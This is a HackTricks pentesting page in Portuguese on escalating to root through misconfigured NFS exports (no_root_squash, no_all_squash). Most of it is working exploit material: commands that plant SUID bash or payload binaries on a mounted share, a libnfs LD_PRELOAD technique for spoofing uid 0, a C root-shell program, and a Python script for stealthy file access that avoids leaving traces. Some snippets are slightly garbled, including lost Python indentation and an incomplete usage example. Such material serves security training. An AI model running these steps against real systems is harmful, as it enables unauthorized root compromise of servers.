<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) no github.

</details>


Leia o arquivo _ **/etc/exports** _, se você encontrar algum diretório configurado como **no\_root\_squash**, então você pode **acessá-lo** **como um cliente** e **escrever dentro** desse diretório **como** se fosse o **root** local da máquina.

**no\_root\_squash**: Essa opção basicamente dá autoridade ao usuário root no cliente para acessar arquivos no servidor NFS como root. E isso pode levar a sérias implicações de segurança.

**no\_all\_squash:** Essa opção é semelhante à **no\_root\_squash** mas se aplica a **usuários não-root**. Imagine que você tenha um shell como usuário nobody; verificou o arquivo /etc/exports; a opção no\_all\_squash está presente; verifique o arquivo /etc/passwd; emule um usuário não-root; crie um arquivo suid como esse usuário (montando usando nfs). Execute o suid como usuário nobody e torne-se um usuário diferente.

# Escalonamento de Privilégios

## Exploração Remota

Se você encontrou essa vulnerabilidade, você pode explorá-la:

* **Montando esse diretório** em uma máquina cliente e, **como root, copiando** para dentro da pasta montada o binário **/bin/bash** e concedendo a ele direitos **SUID**, e **executando a partir da máquina vítima** esse binário bash.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
* **Montando esse diretório** em uma máquina cliente e, **como root, copiando** dentro da pasta montada nosso payload compilado que irá abusar da permissão SUID, dar a ele direitos **SUID** e **executar a partir da máquina vítima** esse binário (você pode encontrar aqui alguns [payloads C SUID](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Exploit Local

{% hint style="info" %}
Observe que se você puder criar um **túnel da sua máquina para a máquina vítima, você ainda pode usar a versão Remota para explorar essa escalada de privilégios tunelando as portas necessárias**.\
A dica a seguir é para o caso do arquivo `/etc/exports` **indicar um endereço IP**. Neste caso, você **não poderá usar** de forma alguma o **exploit remoto** e precisará **abusar deste truque**.\
Outro requisito necessário para o funcionamento do exploit é que **a exportação dentro de `/etc/export`** **deve estar usando a flag `insecure`**.\
\--_Não tenho certeza de que se `/etc/export` estiver indicando um endereço IP este truque funcionará_--
{% endhint %}

## Informações Básicas

O cenário envolve a exploração de um compartilhamento NFS montado em uma máquina local, aproveitando uma falha na especificação do NFSv3 que permite ao cliente especificar seu uid/gid, possibilitando potencialmente o acesso não autorizado. A exploração envolve o uso de [libnfs](https://github.com/sahlberg/libnfs), uma biblioteca que permite a falsificação de chamadas RPC do NFS.

### Compilando a Biblioteca

Os passos para compilação da biblioteca podem requerer ajustes baseados na versão do kernel. Neste caso específico, as chamadas de sistema fallocate foram comentadas. O processo de compilação envolve os seguintes comandos:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Realizando o Exploit

O exploit envolve a criação de um programa simples em C (`pwn.c`) que eleva privilégios para root e, em seguida, executa um shell. O programa é compilado e o binário resultante (`a.out`) é colocado no compartilhamento com suid root, usando `ld_nfs.so` para falsificar o uid nas chamadas RPC:

1. **Compile o código do exploit:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Coloque o exploit no compartilhamento e modifique suas permissões falsificando o uid:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://servidor-nfs/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://servidor-nfs/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://servidor-nfs/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://servidor-nfs/nfs_root/a.out
```

3. **Execute o exploit para obter privilégios de root:**
```bash
/mnt/share/a.out
#root
```

## Bônus: NFShell para Acesso Furtivo a Arquivos
Uma vez obtido o acesso root, para interagir com o compartilhamento NFS sem alterar a propriedade (para evitar deixar rastros), um script Python (nfsh.py) é utilizado. Este script ajusta o uid para corresponder ao do arquivo sendo acessado, permitindo a interação com arquivos no compartilhamento sem problemas de permissão:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Executar como:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
# Referências
* https://www.errno.fr/nfs_privesc.html


<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
